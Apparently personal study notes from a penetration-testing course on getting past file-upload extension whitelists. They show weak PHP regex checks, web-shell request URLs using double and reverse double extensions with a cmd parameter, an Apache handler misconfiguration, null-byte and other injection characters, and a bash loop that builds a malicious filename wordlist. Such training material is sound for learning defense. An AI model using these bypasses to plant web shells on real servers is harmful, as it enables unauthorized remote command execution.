## Whitelisting Extensions
![](Pasted%20image%2020260710125220.png)
![](Pasted%20image%2020260710125257.png)

The following is an example of a file extension whitelist test:

```php
$fileName = basename($_FILES["uploadFile"]["name"]); 

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) { 
	echo "Only images are allowed"; 
	die(); 
}
```
## Double Extensions
![](Pasted%20image%2020260710125553.png)

```url
http://SERVER_IP:PORT/profile_images/shell.jpg.php?cmd=id
```
![](Pasted%20image%2020260710125622.png)

However, this may not always work, as some web applications may use a strict `regex` pattern, as mentioned earlier, like the following:

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```
## Reverse Double Extension

```xml
<FilesMatch ".+\.ph(ar|p|tml)"> 
	SetHandler application/x-httpd-php 
</FilesMatch>
```
![](Pasted%20image%2020260710125942.png)

```url
http://SERVER_IP:PORT/profile_images/shell.php.jpg?cmd=id
```
![](Pasted%20image%2020260710130005.png)
## Character Injection

- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do 
	for ext in '.php' '.phps'; do 
		echo "shell$char$ext.jpg" >> wordlist.txt 
		echo "shell$ext$char.jpg" >> wordlist.txt 
		echo "shell.jpg$char$ext" >> wordlist.txt 
		echo "shell.jpg$ext$char" >> wordlist.txt 
	done 
done
```
